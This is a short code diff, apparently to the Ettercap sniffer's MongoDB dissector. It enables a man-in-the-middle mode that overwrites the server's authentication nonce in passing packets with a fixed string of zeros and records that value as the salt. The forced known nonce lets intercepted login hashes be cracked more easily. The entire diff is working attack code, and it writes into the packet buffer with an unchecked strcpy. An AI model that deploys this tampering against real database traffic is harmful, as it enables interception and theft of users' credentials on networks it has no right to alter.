@@ -34,6 +34,8 @@ struct mongodb_status {
    u_char salt[17];
 };
 
+#define MITM
+
 #define WAIT_RESPONSE   1
 #define WAIT_RESULT   2
 
@@ -56,6 +58,8 @@ void __init mongodb_init(void)
 
 FUNC_DECODER(dissector_mongodb)
 {
+   u_char *rpt;
+   rpt = PACKET->DATA.data;
    DECLARE_DISP_PTR_END(ptr, end);
    struct ec_session *s = NULL;
    void *ident = NULL;
@@ -69,7 +73,7 @@ FUNC_DECODER(dissector_mongodb)
       dissect_create_ident(&ident, PACKET, DISSECT_CODE(dissector_mongodb));
       /* if the session does not exist... */
       if (session_get(&s, ident, DISSECT_IDENT_LEN) == -ENOTFOUND) {
-         unsigned char *noncep  = memmem(ptr, PACKET->DATA.len, "nonce", 5);
+         unsigned char *noncep  = memmem(rpt, PACKET->DATA.len, "nonce", 5);
          unsigned char *gnoncep  = memmem(ptr, PACKET->DATA.len, "getnonce\x00", 9);
          unsigned char *keyp  = memmem(ptr, PACKET->DATA.len, "authenticate\x00", 12);
          if (noncep && !gnoncep && !keyp) {
@@ -85,12 +89,13 @@ FUNC_DECODER(dissector_mongodb)
             /* find and change nonce  */
             unsigned char *p = noncep;
             p += (5 + 1 + 4); /* skip over "nonce" + '\x00; + length */
-            strncpy((char*)conn_status->salt, (char*)p, 16);
-            conn_status->salt[16] = 0;
 #ifdef MITM
-            memset(p, 0, 16);
+            strcpy(p, "0000000000000000");
             PACKET->flags |= PO_MODIFIED;
 #endif
+            strncpy((char*)conn_status->salt, (char*)p, 16);
+            conn_status->salt[16] = 0;
+
             /* save the session */
             session_put(s);
          }
